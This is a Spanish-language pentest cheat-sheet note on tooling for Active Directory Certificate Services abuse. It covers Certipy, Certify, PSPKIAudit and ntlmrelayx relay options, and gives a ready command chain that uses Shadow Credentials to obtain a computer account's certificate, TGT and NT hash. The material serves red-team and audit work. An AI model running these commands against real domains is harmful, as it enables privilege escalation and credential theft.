---
aliases:
  - ADCS Tooling
tags:
  - technique/discovery
  - asset/active-directory
  - env/windows
  - service/ad-cs
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD CS Abuse]]"
  - "[[Certipy]]"
---
# AD CS Abuse - Tooling

---

## Herramientas

| **Herramienta** | **Uso** | **Cuándo** |
|:---|:---|:---|
| `certipy find/req/auth/template/ca/shadow` ([[Certipy]]) | Swiss-army de AD CS en Linux | Workflow principal. |
| `.\Certify.exe find/request` (GhostPack) | Enum + request on-host Windows | Sin Linux / desde el host. |
| `Invoke-PKIAudit` (PSPKIAudit) | Audit ofensivo/defensivo de la PKI | Reporte detallado. |
| `ntlmrelayx.py --adcs` / `-icpr` | Relay NTLM a web (ESC8) / RPC (ESC11) | Vectores de relay. |
| `certipy shadow auto -u U -p P -account TARGET$` | Shadow Credentials → cert → hash (cadena ADCS) | Con GenericWrite sobre el target. |
^adcs-tooling

### Cadena Shadow Credentials + ADCS

```bash
# Con GenericWrite sobre una computer account → cert + hash
certipy shadow auto -u attacker -p pass -account TARGET$ -dc-ip 10.10.10.10
certipy auth -pfx TARGET.pfx -dc-ip 10.10.10.10   # → TGT + NT hash de TARGET$
```

Detalle: [[Shadow Credentials]] · [[UnPAC-the-hash]].
